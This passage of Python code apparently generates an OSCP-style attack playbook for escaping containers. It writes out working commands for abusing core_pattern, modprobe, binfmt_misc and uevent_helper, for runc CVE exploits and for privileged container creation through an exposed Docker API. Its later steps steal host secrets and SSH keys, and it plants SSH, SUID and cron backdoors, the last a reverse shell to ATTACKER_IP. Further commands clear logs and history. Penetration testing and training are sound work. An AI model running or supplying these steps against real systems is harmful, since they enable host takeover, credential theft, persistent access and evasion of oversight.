                        'description': 'Brute-force container path when not disclosed in mountinfo',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'ADVANCED'],
                        'flag_explanations': {
                            'release_agent_pid_brute.sh': 'Brute forces PID paths to find container location'
                        },
                        'success_indicators': [
                            'Container path discovered',
                            'Host command execution achieved',
                            'Output file created'
                        ],
                        'failure_indicators': [
                            'Max PID reached without success',
                            'Brute force takes too long'
                        ],
                        'next_steps': [
                            'Review output file for host process list',
                            'Modify script to execute custom payload'
                        ],
                        'alternatives': [
                            'Manual: Try common paths /var/lib/docker/overlay2/...',
                            'Search for container ID in /proc/self/cgroup'
                        ],
                        'notes': 'Brute forces PIDs 1-65535. Can take 10-20 minutes. Use if PoC1 and PoC2 fail.',
                        'estimated_time': '10-20 minutes'
                    }
                },
                {
                    'id': 'cve-2022-0492-check',
                    'name': 'Check Kernel Vulnerable to CVE-2022-0492',
                    'type': 'command',
                    'metadata': {
                        'command': 'uname -r',
                        'description': 'Check kernel version for CVE-2022-0492 vulnerability',
                        'tags': ['OSCP:HIGH', 'ENUM'],
                        'success_indicators': [
                            'Kernel < 5.16.2 (vulnerable)',
                            'Kernel < 5.15.17 (vulnerable)',
                            'Kernel < 5.10.93 (vulnerable)',
                            'Kernel < 5.4.176 (vulnerable)'
                        ],
                        'failure_indicators': [
                            'Kernel >= 5.16.2 (patched)'
                        ],
                        'next_steps': [
                            'If vulnerable: Attempt cgroup escape without CAP_SYS_ADMIN',
                            'If patched: Need CAP_SYS_ADMIN or privileged container',
                            'Try unshare-based capability recovery'
                        ],
                        'notes': 'CVE-2022-0492: cgroup release_agent can be written without CAP_SYS_ADMIN in initial namespace. Patched in 5.16.2+.',
                        'estimated_time': '5 seconds'
                    }
                }
            ]
        }

    def _create_sensitive_mount_tasks(self) -> Dict[str, Any]:
        """Phase 6: Sensitive mount detection and exploitation"""
        return {
            'id': 'sensitive-mounts-abuse',
            'name': 'Phase 6: Sensitive Mount Exploitation',
            'type': 'parent',
            'children': [
                {
                    'id': 'find-sensitive-mounts',
                    'name': 'Enumerate Mounted Filesystems',
                    'type': 'command',
                    'metadata': {
                        'command': 'mount | grep -E "/proc|/sys|/dev|/var|/etc|/root|/home"',
                        'description': 'Find mounted host directories that may contain sensitive data or escape vectors',
                        'tags': ['OSCP:HIGH', 'ENUM'],
                        'flag_explanations': {
                            'mount': 'Display all mounted filesystems',
                            'grep -E': 'Filter for sensitive paths'
                        },
                        'success_indicators': [
                            'Host /var mounted',
                            'Host /etc mounted',
                            '/sys or /proc mounted writable',
                            'Host /root mounted'
                        ],
                        'failure_indicators': [
                            'Only container-specific mounts found'
                        ],
                        'next_steps': [
                            'If /var mounted: Access other containers\' filesystems',
                            'If /etc mounted: Modify host configs',
                            'If /sys writable: Exploit kernel interfaces',
                            'If /proc writable: Exploit core_pattern, modprobe, etc.'
                        ],
                        'alternatives': [
                            'cat /proc/mounts',
                            'findmnt',
                            'df -h'
                        ],
                        'notes': 'Look for volume mounts: -v /:/host, -v /var:/hostvar, etc.',
                        'estimated_time': '10 seconds'
                    }
                },
                {
                    'id': 'proc-sys-exploitation',
                    'name': 'Exploit /proc/sys Writable Paths',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'core-pattern-escape',
                            'name': '/proc/sys/kernel/core_pattern Escape',
                            'type': 'command',
                            'metadata': {
                                'command': '''# Check write access
[ -w /proc/sys/kernel/core_pattern ] && echo "Writable!"
# Find container path on host
overlay=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)
# Write payload
echo "#!/bin/sh" > /shell.sh
echo "id > $overlay/output.txt" >> /shell.sh
chmod +x /shell.sh
# Set core_pattern to execute payload
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
# Trigger crash to execute payload
./crash_program
# Read output
cat /output.txt''',
                                'description': 'Exploit core_pattern to execute script on host when program crashes',
                                'tags': ['OSCP:HIGH', 'EXPLOIT'],
                                'flag_explanations': {
                                    'core_pattern': 'Kernel setting for core dump handler',
                                    '|script': 'Pipe core dump to script (executes on host)',
                                    'crash_program': 'Trigger segfault to invoke handler'
                                },
                                'success_indicators': [
                                    'core_pattern is writable',
                                    'Script executed on host after crash',
                                    'Host command output visible'
                                ],
                                'failure_indicators': [
                                    'Read-only file system',
                                    'Permission denied'
                                ],
                                'next_steps': [
                                    'Modify shell.sh for reverse shell',
                                    'Extract host credentials',
                                    'Install persistence mechanisms'
                                ],
                                'alternatives': [
                                    'Use different trigger: kernel NULL pointer dereference',
                                    'Write C program that crashes: int main() { char buf[1]; for(int i=0; i<100; i++) buf[i]=1; }'
                                ],
                                'notes': 'Requires writable /proc/sys/kernel/core_pattern. Common in privileged containers.'
                            }
                        },
                        {
                            'id': 'modprobe-escape',
                            'name': '/proc/sys/kernel/modprobe Escape',
                            'type': 'command',
                            'metadata': {
                                'command': '''# Check current modprobe path
cat /proc/sys/kernel/modprobe
# Write payload
echo "#!/bin/sh" > /evil.sh
echo "cp /bin/bash /tmp/rootbash" >> /evil.sh
echo "chmod +s /tmp/rootbash" >> /evil.sh
chmod +x /evil.sh
# Overwrite modprobe path
echo "/evil.sh" > /proc/sys/kernel/modprobe
# Trigger modprobe execution (load unknown module format)
echo -ne "\\xff\\xff\\xff\\xff" > /tmp/fake_module
chmod +x /tmp/fake_module
/tmp/fake_module''',
                                'description': 'Hijack kernel module loader to execute arbitrary script',
                                'tags': ['OSCP:MEDIUM', 'EXPLOIT'],
                                'success_indicators': [
                                    'modprobe path changed',
                                    'Script executed when module load attempted',
                                    'SUID binary created'
                                ],
                                'notes': 'Requires writable /proc/sys/kernel/modprobe and ability to trigger module load'
                            }
                        },
                        {
                            'id': 'binfmt-misc-escape',
                            'name': '/proc/sys/fs/binfmt_misc Escape',
                            'type': 'command',
                            'metadata': {
                                'command': '''# Check if writable
[ -w /proc/sys/fs/binfmt_misc/register ] && echo "Exploitable!"
# Register handler for custom binary format
echo ":evil:M:0:\\x7f\\x45\\x4c\\x46::/evil.sh:" > /proc/sys/fs/binfmt_misc/register
# Create evil.sh handler
echo "#!/bin/sh" > /evil.sh
echo "id > /tmp/pwned" >> /evil.sh
chmod +x /evil.sh
# Trigger by executing matching binary''',
                                'description': 'Register interpreter for binary formats to execute handler on host',
                                'tags': ['OSCP:MEDIUM', 'EXPLOIT'],
                                'notes': 'binfmt_misc allows registering handlers for binary formats. Can lead to RCE.'
                            }
                        }
                    ]
                },
                {
                    'id': 'sys-kernel-exploitation',
                    'name': 'Exploit /sys/kernel Paths',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'uevent-helper-escape',
                            'name': '/sys/kernel/uevent_helper Escape',
                            'type': 'command',
                            'metadata': {
                                'command': '''# Create payload
echo "#!/bin/sh" > /evil-helper
echo "ps > /output" >> /evil-helper
chmod +x /evil-helper
# Find host path
host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)
# Set uevent_helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# Trigger uevent
echo change > /sys/class/mem/null/uevent
# Read output
cat /output''',
                                'description': 'Exploit uevent_helper to execute script on kernel device events',
                                'tags': ['OSCP:HIGH', 'EXPLOIT'],
                                'flag_explanations': {
                                    'uevent_helper': 'Kernel helper executed on device uevents',
                                    '/sys/class/mem/null/uevent': 'Trigger uevent by writing to uevent file'
                                },
                                'success_indicators': [
                                    'uevent_helper is writable',
                                    'Script executed on host',
                                    'Output file created with host processes'
                                ],
                                'notes': 'Less common than release_agent but powerful if accessible'
                            }
                        }
                    ]
                },
                {
                    'id': 'var-mount-exploitation',
                    'name': 'Exploit Mounted /var (Container Pivoting)',
                    'type': 'command',
                    'metadata': {
                        'command': '''# Find other containers' filesystems
find /host-var/lib/docker/overlay2/ -name "*.env*" 2>/dev/null
find /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/ -name "*.env*" 2>/dev/null
# Extract secrets
cat /host-var/lib/containerd/.../fs/usr/src/app/.env
# Backdoor other containers
echo "malicious payload" > /host-var/lib/docker/overlay2/.../merged/app/backdoor.sh
# Steal credentials
find /host-var/lib/kubelet/pods/ -name "*token*" 2>/dev/null''',
                        'description': 'If /var is mounted, access other containers and extract secrets',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'LATERAL'],
                        'flag_explanations': {
                            '/var/lib/docker/overlay2': 'Docker container filesystems',
                            '/var/lib/containerd': 'containerd container filesystems',
                            '/var/lib/kubelet/pods': 'Kubernetes pod data (tokens, secrets)'
                        },
                        'success_indicators': [
                            'Other containers\' filesystems accessible',
                            'Environment files with secrets found',
                            'Kubernetes tokens extracted',
                            'Cloud credentials (AWS webidentity tokens) found'
                        ],
                        'failure_indicators': [
                            '/var not mounted',
                            'Access denied to overlay directories'
                        ],
                        'next_steps': [
                            'Extract all .env files for secrets',
                            'Backdoor web applications in other containers',
                            'Use Kubernetes tokens to access K8s API',
                            'Use cloud tokens for cloud access (AWS, GCP, Azure)',
                            'Modify cron jobs or systemd services for persistence'
                        ],
                        'alternatives': [
                            'Check /var/lib/docker/containers/ for container configs',
                            'Check /var/lib/docker/volumes/ for data volumes'
                        ],
                        'notes': 'Mounted /var = lateral movement paradise. Access all containers on host.',
                        'estimated_time': '5-10 minutes'
                    }
                }
            ]
        }

    def _create_namespace_abuse_tasks(self) -> Dict[str, Any]:
        """Phase 7: Namespace abuse and host access"""
        return {
            'id': 'namespace-abuse',
            'name': 'Phase 7: Namespace Abuse',
            'type': 'parent',
            'children': [
                {
                    'id': 'hostpid-abuse',
                    'name': 'hostPID Namespace Abuse',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'steal-process-env',
                            'name': 'Extract Environment Variables from Host Processes',
                            'type': 'command',
                            'metadata': {
                                'command': 'for e in $(ls /proc/*/environ 2>/dev/null); do echo; echo $e; xargs -0 -L1 -a $e 2>/dev/null; done | grep -E "PASSWORD|SECRET|TOKEN|KEY|API"',
                                'description': 'Extract secrets from host process environment variables',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'HOSTPID'],
                                'flag_explanations': {
                                    '/proc/*/environ': 'Environment variables for all processes',
                                    'xargs -0 -L1': 'Convert null-separated values to lines',
                                    'grep -E': 'Filter for common secret patterns'
                                },
                                'success_indicators': [
                                    'Database passwords found',
                                    'API tokens discovered',
                                    'AWS/cloud credentials extracted',
                                    'Kubernetes secrets visible'
                                ],
                                'failure_indicators': [
                                    'Permission denied (not hostPID)',
                                    'No sensitive data found'
                                ],
                                'next_steps': [
                                    'Test extracted credentials',
                                    'Use API tokens for lateral movement',
                                    'Access databases with found credentials',
                                    'Use cloud credentials for cloud access'
                                ],
                                'alternatives': [
                                    'cat /proc/<pid>/environ | strings',
                                    'Search specific processes: ps aux | grep mysql'
                                ],
                                'notes': 'Requires --pid=host. Common in Kubernetes privilege escalation.',
                                'estimated_time': '1 minute'
                            }
                        },
                        {
                            'id': 'read-process-fds',
                            'name': 'Read Open File Descriptors',
                            'type': 'command',
                            'metadata': {
                                'command': 'for fd in $(find /proc/*/fd -type l 2>/dev/null); do readlink $fd 2>/dev/null | grep -E "secret|key|password|token|.env"; done',
                                'description': 'Find open files containing sensitive data in host processes',
                                'tags': ['OSCP:HIGH', 'HOSTPID'],
                                'success_indicators': [
                                    'Secret files found',
                                    'Configuration files discovered',
                                    'Can read open file contents'
                                ],
                                'next_steps': [
                                    'cat /proc/<pid>/fd/<fd> to read file contents',
                                    'Extract credentials from open files'
                                ],
                                'notes': 'Open file descriptors bypass filesystem permissions'
                            }
                        },
                        {
                            'id': 'nsenter-to-host',
                            'name': 'nsenter to Host Namespaces',
                            'type': 'command',
                            'metadata': {
                                'command': 'nsenter --target 1 --mount --uts --ipc --net --pid -- bash',
                                'description': 'Enter all namespaces of host init process (PID 1)',
                                'tags': ['OSCP:HIGH', 'EXPLOIT', 'CRITICAL'],
                                'flag_explanations': {
                                    '--target 1': 'Target host init process',
                                    '--mount': 'Enter mount namespace',
                                    '--uts': 'Enter UTS namespace (hostname)',
                                    '--ipc': 'Enter IPC namespace',
                                    '--net': 'Enter network namespace',
                                    '--pid': 'Enter PID namespace'
                                },
                                'success_indicators': [
                                    'Shell spawned in host context',
                                    'Full host access achieved',
                                    'Can see all host processes and files'
                                ],
                                'failure_indicators': [
                                    'Permission denied',
                                    'nsenter not available'
                                ],
                                'notes': 'Requires --pid=host + CAP_SYS_ADMIN or privileged. Full host escape.'
                            }
                        }
                    ]
                },
                {
                    'id': 'hostnetwork-abuse',
                    'name': 'hostNetwork Abuse',
                    'type': 'command',
                    'metadata': {
                        'command': 'tcpdump -i eth0 -w /tmp/capture.pcap',
                        'description': 'Sniff ALL host network traffic when hostNetwork=true',
                        'tags': ['OSCP:HIGH', 'HOSTNETWORK'],
                        'flag_explanations': {
                            '-i eth0': 'Capture on host network interface',
                            '-w': 'Write to pcap file'
                        },
                        'success_indicators': [
                            'Packets captured',
                            'Host traffic visible',
                            'Can intercept credentials, API calls, etc.'
                        ],
                        'next_steps': [
                            'Analyze pcap with wireshark',
                            'Extract passwords from clear-text protocols',
                            'Spoof traffic to metadata service (cloud)',
                            'Access localhost-bound services on host'
                        ],
                        'notes': 'hostNetwork gives full host network access. Can MITM cloud metadata.'
                    }
                },
                {
                    'id': 'hostipc-abuse',
                    'name': 'hostIPC Shared Memory Access',
                    'type': 'command',
                    'metadata': {
                        'command': 'ls -la /dev/shm && ipcs -a',
                        'description': 'Access host shared memory segments',
                        'tags': ['OSCP:MEDIUM', 'HOSTIPC'],
                        'success_indicators': [
                            'Shared memory segments visible',
                            'Can read/write shared memory',
                            'IPC facilities accessible'
                        ],
                        'next_steps': [
                            'Extract data from shared memory',
                            'Inject data into host processes via shared memory'
                        ],
                        'notes': 'hostIPC exposes /dev/shm and System V IPC facilities'
                    }
                }
            ]
        }

    def _create_cve_exploitation_tasks(self) -> Dict[str, Any]:
        """Phase 8: Known CVE exploitation"""
        return {
            'id': 'cve-exploitation',
            'name': 'Phase 8: CVE-Based Escapes',
            'type': 'parent',
            'children': [
                {
                    'id': 'cve-2019-5736-runc',
                    'name': 'CVE-2019-5736: runc Overwrite',
                    'type': 'command',
                    'metadata': {
                        'command': '''# Download exploit
wget https://github.com/Frichetten/CVE-2019-5736-PoC/raw/master/main.go
# Modify payload in main.go
# Build exploit
go build main.go
# Place in container and execute
# Wait for 'docker exec' from host to trigger''',
                        'description': 'Overwrite host /bin/sh via runc vulnerability (requires docker exec from host)',
                        'tags': ['OSCP:HIGH', 'CVE-2019-5736', 'EXPLOIT'],
                        'success_indicators': [
                            'Exploit compiled',
                            'Waiting for docker exec trigger',
                            'Host /bin/sh overwritten',
                            'Payload executes on host'
                        ],
                        'failure_indicators': [
                            'runc version patched (>= 1.0.0-rc8)',
                            'No docker exec activity from host'
                        ],
                        'next_steps': [
                            'Wait for admin to run: docker exec -it <container> /bin/sh',
                            'Payload triggers and compromises host',
                            'Establish persistence'
                        ],
                        'notes': 'Requires docker exec from host. Patches: runc >= 1.0.0-rc8. Famous escape.'
                    }
                },
                {
                    'id': 'cve-2022-0492-info',
                    'name': 'CVE-2022-0492: cgroup release_agent',
                    'type': 'command',
                    'metadata': {
                        'command': 'echo "See Phase 5: cgroup release_agent escape tasks"',
                        'description': 'Container escape without CAP_SYS_ADMIN in initial namespace',
                        'tags': ['OSCP:HIGH', 'CVE-2022-0492'],
                        'notes': 'Kernel vulnerability allowing release_agent write without proper caps. Covered in Phase 5.'
                    }
                },
                {
                    'id': 'cve-2024-21626-runc-leaky-vessels',
                    'name': 'CVE-2024-21626: runc Leaky Vessels',
                    'type': 'command',
                    'metadata': {
                        'command': '''# Create Dockerfile
cat <<EOF > Dockerfile
FROM scratch
WORKDIR /proc/self/fd/4
CMD ["/bin/sh"]
EOF
# Build and run - fd 4 leaks host root directory''',
                        'description': 'runc file descriptor leak allows accessing host filesystem',
                        'tags': ['OSCP:HIGH', 'CVE-2024-21626', 'RESEARCH'],
                        'success_indicators': [
                            'Working directory points to host root',
                            'Host files accessible'
                        ],
                        'notes': 'runc <= 1.1.11 vulnerable. Fixed in 1.1.12. Docker >= 25.0.3 patched.'
                    }
                },
                {
                    'id': 'check-container-cves',
                    'name': 'Automated CVE Detection',
                    'type': 'command',
                    'metadata': {
                        'command': '''# Check runtime version
runc --version
docker --version
containerd --version
# Check kernel for known CVEs
uname -r
# Use CDK for automated CVE detection
curl -sL https://github.com/cdk-team/CDK/releases/download/v1.5.2/cdk_linux_amd64 -o cdk
chmod +x cdk
./cdk eva''',
                        'description': 'Identify vulnerable container runtime and kernel versions',
                        'tags': ['OSCP:HIGH', 'ENUM'],
                        'success_indicators': [
                            'Runtime versions identified',
                            'Known CVEs detected',
                            'Exploitable vulnerabilities found'
                        ],
                        'next_steps': [
                            'Research CVEs for runtime version',
                            'Download and test exploits',
                            'Check exploit-db and GitHub for PoCs'
                        ],
                        'alternatives': [
                            'grype: Scan container image for CVEs',
                            'searchsploit docker',
                            'searchsploit runc'
                        ]
                    }
                }
            ]
        }

    def _create_docker_api_tasks(self, target: str, port: int) -> Dict[str, Any]:
        """Phase 9: Docker API exploitation (ports 2375/2376)"""
        return {
            'id': 'docker-api-exploitation',
            'name': 'Phase 9: Docker API Exploitation',
            'type': 'parent',
            'children': [
                {
                    'id': 'docker-api-enum',
                    'name': 'Enumerate Docker API',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl http://{target}:{port}/version',
                        'description': 'Check if Docker API is exposed and retrieve version info',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                        'flag_explanations': {
                            '/version': 'Docker API version endpoint'
                        },
                        'success_indicators': [
                            'JSON response with Docker version',
                            'API is accessible without authentication',
                            'Version information disclosed'
                        ],
                        'failure_indicators': [
                            'Connection refused',
                            'Authentication required',
                            'Timeout'
                        ],
                        'next_steps': [
                            'List containers: curl .../containers/json',
                            'List images: curl .../images/json',
                            'Create privileged container for escape',
                            'Execute commands in existing containers'
                        ],
                        'alternatives': [
                            f'docker -H tcp://{target}:{port} version',
                            f'nmap --script docker-version -p {port} {target}'
                        ],
                        'notes': 'Unauthenticated Docker API = instant root. Default ports: 2375 (HTTP), 2376 (HTTPS)',
                        'estimated_time': '10 seconds'
                    }
                },
                {
                    'id': 'docker-api-list-containers',
                    'name': 'List Running Containers',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl http://{target}:{port}/containers/json',
                        'description': 'List all running containers via API',
                        'tags': ['OSCP:HIGH', 'ENUM'],
                        'success_indicators': [
                            'Container list returned',
                            'Container IDs visible',
                            'Container names and images listed'
                        ],
                        'alternatives': [
                            f'docker -H tcp://{target}:{port} ps'
                        ]
                    }
                },
                {
                    'id': 'docker-api-create-escape',
                    'name': 'Create Privileged Container via API',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -X POST -H "Content-Type: application/json" http://{target}:{port}/containers/create -d \'{{{{ "Image": "alpine", "Cmd": ["/bin/sh"], "HostConfig": {{{{ "Privileged": true, "Binds": ["/:/host"] }}}}, "OpenStdin": true, "Tty": true }}}}\'',
                        'description': 'Create privileged container with host root mounted via Docker API',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'CRITICAL'],
                        'flag_explanations': {
                            'Privileged: true': 'Run with all capabilities',
                            'Binds: ["/:/host"]': 'Mount host root to /host in container'
                        },
                        'success_indicators': [
                            'Container created (returns container ID)',
                            'HTTP 201 Created response',
                            'Container ID in response'
                        ],
                        'next_steps': [
                            'Start container: curl -X POST .../containers/<id>/start',
                            'Attach to container: docker attach or curl exec endpoint',
                            'chroot /host /bin/bash for host access'
                        ],
                        'alternatives': [
                            f'docker -H tcp://{target}:{port} run -it --privileged -v /:/host alpine chroot /host bash'
                        ],
                        'notes': 'Direct API access = trivial escape. Create privileged container, mount host, profit.',
                        'estimated_time': '30 seconds'
                    }
                },
                {
                    'id': 'docker-api-exec',
                    'name': 'Execute Command in Container via API',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -X POST -H "Content-Type: application/json" http://{target}:{port}/containers/<container_id>/exec -d \'{{{{ "AttachStdin": true, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh"], "Tty": true }}}}\'',
                        'description': 'Execute commands in existing containers',
                        'tags': ['OSCP:HIGH', 'EXPLOIT'],
                        'success_indicators': [
                            'Exec instance created',
                            'Command executed in container',
                            'Output received'
                        ],
                        'notes': 'Can backdoor existing containers via API'
                    }
                }
            ]
        }

    def _create_post_escape_tasks(self) -> Dict[str, Any]:
        """Phase 10: Post-escape actions and persistence"""
        return {
            'id': 'post-escape-actions',
            'name': 'Phase 10: Post-Escape Actions',
            'type': 'parent',
            'children': [
                {
                    'id': 'dump-host-secrets',
                    'name': 'Extract Host Secrets',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'dump-shadow',
                            'name': 'Dump /etc/shadow',
                            'type': 'command',
                            'metadata': {
                                'command': 'cat /etc/shadow > /tmp/shadow.txt',
                                'description': 'Extract password hashes for offline cracking',
                                'tags': ['OSCP:HIGH', 'POST_EXPLOIT'],
                                'next_steps': [
                                    'Transfer to attacker machine',
                                    'john /tmp/shadow.txt',
                                    'hashcat -m 1800 /tmp/shadow.txt wordlist.txt'
                                ]
                            }
                        },
                        {
                            'id': 'steal-ssh-keys',
                            'name': 'Steal SSH Keys',
                            'type': 'command',
                            'metadata': {
                                'command': 'find /root /home -name "id_rsa" -o -name "id_ed25519" 2>/dev/null',
                                'description': 'Find and exfiltrate SSH private keys',
                                'tags': ['OSCP:HIGH', 'POST_EXPLOIT'],
                                'next_steps': [
                                    'Copy keys: cat /root/.ssh/id_rsa',
                                    'Use for lateral movement to other systems',
                                    'Check .ssh/authorized_keys for accessible systems'
                                ]
                            }
                        },
                        {
                            'id': 'extract-credentials',
                            'name': 'Extract Application Credentials',
                            'type': 'command',
                            'metadata': {
                                'command': 'find / -name ".env" -o -name "config.php" -o -name "database.yml" 2>/dev/null | head -20',
                                'description': 'Find configuration files with credentials',
                                'tags': ['OSCP:HIGH', 'POST_EXPLOIT'],
                                'next_steps': [
                                    'Review files for database credentials',
                                    'Extract API keys and tokens',
                                    'Use credentials for lateral movement'
                                ]
                            }
                        }
                    ]
                },
                {
                    'id': 'establish-persistence',
                    'name': 'Establish Persistence',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'backdoor-ssh',
                            'name': 'Add SSH Key Backdoor',
                            'type': 'command',
                            'metadata': {
                                'command': 'echo "ssh-rsa AAAAB3NzaC1yc2E... attacker@kali" >> /root/.ssh/authorized_keys',
                                'description': 'Add attacker SSH key for persistent access',
                                'tags': ['OSCP:HIGH', 'POST_EXPLOIT', 'PERSISTENCE'],
                                'notes': 'Replace with your actual SSH public key'
                            }
                        },
                        {
                            'id': 'create-suid-shell',
                            'name': 'Create SUID Shell Backdoor',
                            'type': 'command',
                            'metadata': {
                                'command': 'cp /bin/bash /tmp/.hidden && chmod 4755 /tmp/.hidden',
                                'description': 'Create SUID bash for easy re-access',
                                'tags': ['OSCP:MEDIUM', 'POST_EXPLOIT', 'PERSISTENCE'],
                                'notes': 'Execute with /tmp/.hidden -p to get root shell'
                            }
                        },
                        {
                            'id': 'backdoor-cron',
                            'name': 'Install Cron Job Backdoor',
                            'type': 'command',
                            'metadata': {
                                'command': 'echo "* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /etc/crontab',
                                'description': 'Add reverse shell cron job for persistent access',
                                'tags': ['OSCP:MEDIUM', 'POST_EXPLOIT', 'PERSISTENCE'],
                                'notes': 'Modify ATTACKER_IP and port. Executes every minute.'
                            }
                        }
                    ]
                },
                {
                    'id': 'cover-tracks',
                    'name': 'Cover Tracks',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'clear-logs',
                            'name': 'Clear System Logs',
                            'type': 'command',
                            'metadata': {
                                'command': 'echo "" > /var/log/auth.log && echo "" > /var/log/syslog',
                                'description': 'Clear authentication and system logs',
                                'tags': ['OSCP:LOW', 'POST_EXPLOIT'],
                                'notes': 'LOUD action. May be detected. Use carefully in production.'
                            }
                        },
                        {
                            'id': 'remove-command-history',
                            'name': 'Clear Command History',
                            'type': 'command',
                            'metadata': {
                                'command': 'history -c && rm ~/.bash_history',
                                'description': 'Remove shell command history',
                                'tags': ['OSCP:LOW', 'POST_EXPLOIT']
                            }
                        }
                    ]
                }
            ]
        }
